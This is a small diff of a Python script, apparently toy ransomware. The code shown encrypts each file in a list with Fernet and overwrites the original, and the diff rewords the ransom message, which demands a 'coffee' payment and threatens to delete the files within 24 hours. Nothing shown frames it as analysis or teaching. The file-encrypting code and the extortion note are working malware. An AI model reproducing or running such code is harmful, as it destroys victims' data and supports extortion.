@@ -28,4 +28,5 @@ for file in files:
     encryption = Fernet(key).encrypt(contents)
     with open(file, 'wb') as corruptedFiles:
         corruptedFiles.write(encryption)
-print("Your computer has been hacked! Buy me a coffee at ==> buymeacoffee/hacksandcodes or get them deleted within 24hrs")
+print("""Your computer has been hacked! Buy me a coffee at ==> buymeacoffee/hacksandcodes else your
+       files will be deleted within 24hrs""")
